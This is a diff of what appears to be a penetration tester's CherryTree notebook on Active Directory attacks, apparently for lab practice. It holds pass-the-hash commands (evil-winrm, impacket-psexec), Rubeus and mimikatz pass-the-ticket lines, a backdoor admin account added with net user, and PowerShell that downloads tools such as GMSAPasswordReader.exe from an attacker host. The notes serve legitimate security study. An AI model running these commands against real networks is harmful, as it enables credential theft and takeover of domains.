@@ -1372,7 +1372,7 @@ Password: &lt;password&gt;</codebox>
         <codebox char_offset="410" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
         <codebox char_offset="435" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1689286530">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1689473294">
         <rich_text>
 
 
@@ -1393,6 +1393,14 @@ Password: &lt;password&gt;</codebox>
         <rich_text>
 </rich_text>
         <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
+        <rich_text>
+
+
+Exe files to use for redteam:
+
+
+</rich_text>
+        <rich_text link="webs https://github.com/expl0itabl3/Toolies">https://github.com/expl0itabl3/Toolies</rich_text>
         <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687814576">
           <rich_text scale="h1">Kerberos Authentication:</rich_text>
           <rich_text>
@@ -1605,7 +1613,7 @@ with mimikatz
           <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
           <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
         </node>
-        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688943845">
+        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1689474300">
           <rich_text>
 </rich_text>
           <rich_text scale="h2">
@@ -1646,7 +1654,11 @@ _________________________________________________________
 </rich_text>
           <rich_text scale="h2">curl replacement in Powershell:</rich_text>
           <rich_text>
+To downoad files:
 
+
+
+pr
 </rich_text>
           <rich_text justification="left"></rich_text>
           <rich_text>
@@ -1763,12 +1775,13 @@ where ptt is pass the ticket
           <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
           <codebox char_offset="125" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user cel1s0 pass123 /add</codebox>
           <codebox char_offset="155" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators cel1s0 /add</codebox>
-          <codebox char_offset="277" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+          <codebox char_offset="295" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.11.1./GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
+          <codebox char_offset="301" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
 $wc = New-Object Net.WebClient
 $wc.DownloadString("http://10.11.1.  whatever else u want with space")
 </codebox>
-          <codebox char_offset="639" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
-          <codebox char_offset="761" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
+          <codebox char_offset="663" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
+          <codebox char_offset="785" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
 or
 
 # Test if HTTP port is open
@@ -1776,15 +1789,15 @@ Test-NetConnection google.com -CommonTCPPort "Http"
 
 # Or define a port number
 Test-NetConnection google.com -Port 80</codebox>
-          <codebox char_offset="845" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
+          <codebox char_offset="869" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"
 
 or  like ippsec writeup
 
 runas /netonly /user:domain.local\user cmd
 </codebox>
-          <codebox char_offset="1630" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
-          <codebox char_offset="1640" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
-          <codebox char_offset="1685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
+          <codebox char_offset="1654" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
+          <codebox char_offset="1664" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
+          <codebox char_offset="1709" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
           <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
             <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
             <rich_text>
@@ -2244,7 +2257,9 @@ Reference:
         </node>
         <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1689286756">
           <rich_text>
-
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
 
 
 References:
